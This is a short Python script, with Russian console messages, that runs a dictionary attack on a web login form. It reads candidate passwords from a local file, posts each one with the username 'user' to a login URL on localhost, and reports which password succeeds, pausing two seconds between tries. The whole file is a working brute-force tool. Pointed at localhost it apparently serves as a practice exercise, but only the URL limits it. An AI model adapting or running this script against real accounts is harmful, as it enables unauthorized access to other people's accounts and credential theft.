import requests
import time


login_url = 'http://localhost:7000/login'
username = 'user'

password_file_path = './password.txt'


def try_login(username, password):
    data = {'username': username, 'password': password}
    response = requests.post(login_url, data=data)
    return response


def main():
    successful = False
    with open(password_file_path, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Пробую пароль: {password}")
            response = try_login(username, password)
            if response.ok:
                print(f"Успех! Вход выполнен с паролем: {password}")
                successful = True
                break
            else:
                print(f"Не удалось войти с паролем: {password}")
            time.sleep(2)

    if not successful:
        print("Не удалось войти ни с одним из паролей.")


if __name__ == '__main__':
    main()
